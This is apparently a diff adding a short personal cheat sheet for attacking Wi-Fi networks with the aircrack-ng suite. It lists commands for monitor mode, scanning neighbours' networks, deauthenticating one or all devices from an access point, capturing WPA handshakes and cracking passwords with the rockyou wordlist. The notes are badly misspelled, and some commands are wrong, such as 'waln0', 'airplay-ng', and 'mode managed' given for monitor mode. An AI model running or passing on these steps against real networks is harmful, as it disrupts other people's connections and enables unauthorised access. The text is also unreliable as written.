@@ -1,0 +1,16 @@
+1- to show mode of your interface use iwconfig
+2- change to monitor mode by : airmon-ng start waln0 or iwconfig wlan0 mode managed
+    airplay-ng -9 waln0mon to check injection
+2- to show all your nabhior network use : $airodump-ng wlan0mon 
+3- to duauthnticate user use : $aireplay-ng -0 50( how many tine do you want to
+   prevent it ) -a (mac for accesspoint) -c ( mac for divce) wlan0mode
+4- to duatnticate all use $aireplay-ng -0 50 -a (mac) wlan0mon
+
+to crack paswwd you need to captcher handcheck from devices 
+1-$airodump-ng wlan0mon --bssid (mac for net) --channel -w capture
+2- now duaynyicate all diveces : more handcheck you get so more chanses
+3- use to crack : $aircrack-ng "path to capture file" -w "wordlist like:
+   /usr/share/wordlist/rockyou 
+   
+   
+
